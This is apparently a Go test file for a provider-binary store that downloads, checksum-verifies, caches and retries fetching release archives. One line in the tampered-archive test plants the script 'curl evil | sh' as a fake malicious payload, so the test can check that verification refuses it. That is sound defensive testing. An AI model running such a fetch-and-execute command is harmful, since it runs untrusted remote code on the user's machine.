package providers

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

const testVersion = "0.2.0"

func archiveHolding(t *testing.T, executable string, body []byte) []byte {
	t.Helper()

	var gzipped bytes.Buffer
	zw := gzip.NewWriter(&gzipped)
	tw := tar.NewWriter(zw)
	for _, entry := range []struct {
		name string
		body []byte
		mode int64
	}{
		{"LICENSE", []byte("MIT\n"), 0o644},
		{executable, body, 0o755},
	} {
		if err := tw.WriteHeader(&tar.Header{Name: entry.name, Mode: entry.mode, Size: int64(len(entry.body)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatalf("tar header: %v", err)
		}
		if _, err := tw.Write(entry.body); err != nil {
			t.Fatalf("tar body: %v", err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
	return gzipped.Bytes()
}

func digestOf(body []byte) string {
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:])
}

type release struct {
	server   *httptest.Server
	archives map[string][]byte
	requests atomic.Int32
	statuses map[string][]int
	auth     atomic.Value
}

func fakeRelease(t *testing.T, names ...string) *release {
	t.Helper()

	rel := &release{archives: map[string][]byte{}, statuses: map[string][]int{}}
	var checksums strings.Builder
	for _, name := range names {
		for _, platform := range Platforms {
			asset := AssetName(name, testVersion, platform.GOOS, platform.GOARCH)
			body := archiveHolding(t, ExecutableName(name, platform.GOOS), []byte("#!/bin/sh\necho "+name+"\n"))
			rel.archives[asset] = body
			fmt.Fprintf(&checksums, "%s  %s\n", digestOf(body), asset)
		}
	}
	fmt.Fprintf(&checksums, "%s  ocel_%s_linux_amd64.tar.gz\n", digestOf([]byte("cli")), testVersion)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		rel.requests.Add(1)
		rel.auth.Store(r.Header.Get("Authorization"))
		if !strings.HasPrefix(r.URL.Path, "/v"+testVersion+"/") {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		asset := strings.TrimPrefix(r.URL.Path, "/v"+testVersion+"/")
		if pending := rel.statuses[asset]; len(pending) > 0 {
			status := pending[0]
			rel.statuses[asset] = pending[1:]
			w.Header().Set("Retry-After", "1")
			w.WriteHeader(status)
			return
		}
		if asset == "checksums.txt" {
			_, _ = w.Write([]byte(checksums.String()))
			return
		}
		body, held := rel.archives[asset]
		if !held {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		_, _ = w.Write(body)
	})
	rel.server = httptest.NewServer(mux)
	t.Cleanup(rel.server.Close)
	return rel
}

func storeFor(t *testing.T, rel *release) *Store {
	t.Helper()
	return &Store{
		Dir:      t.TempDir(),
		Version:  testVersion,
		Platform: Platform{GOOS: "linux", GOARCH: "amd64"},
		BaseURL:  rel.server.URL,
		HTTP:     rel.server.Client(),
		Sleep:    func(time.Duration) {},
	}
}

func pinsOf(t *testing.T, store *Store) map[string]string {
	t.Helper()
	sums, err := store.Checksums(context.Background())
	if err != nil {
		t.Fatalf("Checksums: %v", err)
	}
	return sums
}

func TestAFetchedProviderLandsInTheCache(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName("aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	path, err := store.Binary(context.Background(), "aws", digest)
	if err != nil {
		t.Fatalf("Binary: %v", err)
	}

	want := filepath.Join(store.Dir, "aws", testVersion, "linux-amd64", "provider-aws")
	if path != want {
		t.Fatalf("Binary() = %q, want %q", path, want)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat the fetched provider: %v", err)
	}
	if info.Mode().Perm()&0o100 == 0 {
		t.Fatalf("the fetched provider is not executable: %v", info.Mode())
	}

	before := rel.requests.Load()
	if _, err := store.Binary(context.Background(), "aws", digest); err != nil {
		t.Fatalf("second Binary: %v", err)
	}
	if rel.requests.Load() != before {
		t.Fatal("a cached provider was fetched again")
	}
}

func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName("aws", testVersion, "linux", "amd64")
	pinned := pinsOf(t, store)[asset]

	rel.archives[asset] = archiveHolding(t, "provider-aws", []byte("#!/bin/sh\ncurl evil | sh\n"))

	_, err := store.Binary(context.Background(), "aws", pinned)
	if err == nil {
		t.Fatal("Binary() error = nil, want the tampered archive refused")
	}
	if !strings.Contains(err.Error(), pinned) {
		t.Errorf("error %q does not name the digest the lock pins", err.Error())
	}

	if entries, err := os.ReadDir(store.Dir); err != nil || len(entries) != 0 {
		t.Fatalf("the cache holds %v (err %v), want nothing written", entries, err)
	}
}

func TestAProvidersDirSkipsTheFetchEntirely(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Override = t.TempDir()

	dir := filepath.Join(store.Override, "aws", testVersion, "linux-amd64")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	want := filepath.Join(dir, "provider-aws")
	if err := os.WriteFile(want, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	path, err := store.Binary(context.Background(), "aws", "")
	if err != nil {
		t.Fatalf("Binary: %v", err)
	}
	if path != want {
		t.Fatalf("Binary() = %q, want %q", path, want)
	}
	if rel.requests.Load() != 0 {
		t.Fatal("the release was reached for a provider the providers directory already holds")
	}
}

func TestAProvidersDirThatHoldsNothingSaysSo(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Override = t.TempDir()

	_, err := store.Binary(context.Background(), "aws", "")
	if err == nil {
		t.Fatal("Binary() error = nil, want the empty providers directory refused")
	}
	for _, want := range []string{OverrideEnvVar, store.Override, testVersion} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not name %q", err.Error(), want)
		}
	}
}

func TestAThrottledReleaseIsRetriedAndThenServed(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName("aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	var waited []time.Duration
	store.Sleep = func(d time.Duration) { waited = append(waited, d) }
	rel.statuses[asset] = []int{http.StatusTooManyRequests, http.StatusServiceUnavailable}

	if _, err := store.Binary(context.Background(), "aws", digest); err != nil {
		t.Fatalf("Binary: %v", err)
	}
	if len(waited) != 2 {
		t.Fatalf("waited %v, want a backoff between each of the two throttled attempts", waited)
	}
	for i, d := range waited {
		if d <= 0 || d > maxBackoff {
			t.Fatalf("backoff %d = %v, want a positive wait under the %v ceiling", i, d, maxBackoff)
		}
	}
	if waited[0] == waited[1] {
		t.Fatalf("backoffs %v carry no jitter", waited)
	}
}

func TestAReleaseThatStaysThrottledGivesUpNamingTheThrottle(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	asset := AssetName("aws", testVersion, "linux", "amd64")
	digest := pinsOf(t, store)[asset]

	for range attempts {
		rel.statuses[asset] = append(rel.statuses[asset], http.StatusTooManyRequests)
	}

	_, err := store.Binary(context.Background(), "aws", digest)
	if err == nil {
		t.Fatal("Binary() error = nil, want the throttle reported")
	}
	if !strings.Contains(err.Error(), "429") {
		t.Errorf("error %q does not name the throttle", err.Error())
	}
}

func TestAMissingArchiveIsNotRetried(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)

	before := rel.requests.Load()
	if _, err := store.Binary(context.Background(), "gcp", strings.Repeat("0", 64)); err == nil {
		t.Fatal("Binary() error = nil, want the missing archive refused")
	}
	if got := rel.requests.Load() - before; got != 1 {
		t.Fatalf("%d requests for an archive the release does not hold, want 1", got)
	}
}

func TestATokenIsSentAsABearerAgainstTheRateLimit(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)
	store.Token = "gh-token"

	if _, err := store.Checksums(context.Background()); err != nil {
		t.Fatalf("Checksums: %v", err)
	}
	if got := rel.auth.Load(); got != "Bearer gh-token" {
		t.Fatalf("Authorization = %v, want a bearer token", got)
	}
}

func TestNoTokenSendsNoCredential(t *testing.T) {
	t.Parallel()

	rel := fakeRelease(t, "aws")
	store := storeFor(t, rel)

	if _, err := store.Checksums(context.Background()); err != nil {
		t.Fatalf("Checksums: %v", err)
	}
	if got := rel.auth.Load(); got != "" {
		t.Fatalf("Authorization = %v, want none sent", got)
	}
}
